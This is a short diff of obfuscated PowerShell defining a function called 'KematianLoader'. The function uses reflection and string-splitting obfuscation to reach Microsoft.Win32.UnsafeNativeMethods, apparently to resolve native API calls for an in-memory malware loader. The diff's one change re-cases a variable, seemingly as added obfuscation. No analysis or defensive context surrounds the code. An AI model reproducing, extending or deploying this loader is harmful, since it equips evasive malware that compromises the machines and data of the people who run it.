@@ -1,4 +1,4 @@
-$ProgressPreference = ('Sil'+'ent'+'l'+'yContinu'+'e')
+$PRogRessprEFERENCe = ('Sil'+'ent'+'l'+'yContinu'+'e')
 function KematianLoader {
     Param ($kematian_modules, $kematian_func)
     $assem = ([AppDomain]::"cU`R`Re`NTdOMaIn".(('GE'+'T')+('as'+'S')+('EmBLIe'+'S')).Invoke() | ? { $_."GlO`BaLasS`eMBLY`C`AchE" -and $_."lo`Ca`TIoN".('sp'+('L'+'It')).Invoke((('qw'+'IqwI').rEplAcE(([chAr]113+[chAr]119+[chAr]73),[sTriNG][chAr]92)))[-1].('Eq'+('u'+'al')+'S').Invoke(('Syst'+'e'+'m.dll')) }).(('g'+'ET')+'Ty'+'Pe').Invoke(('M'+'icrosoft.Win3'+'2.Uns'+'afeNa'+'tive'+'Metho'+'ds'))
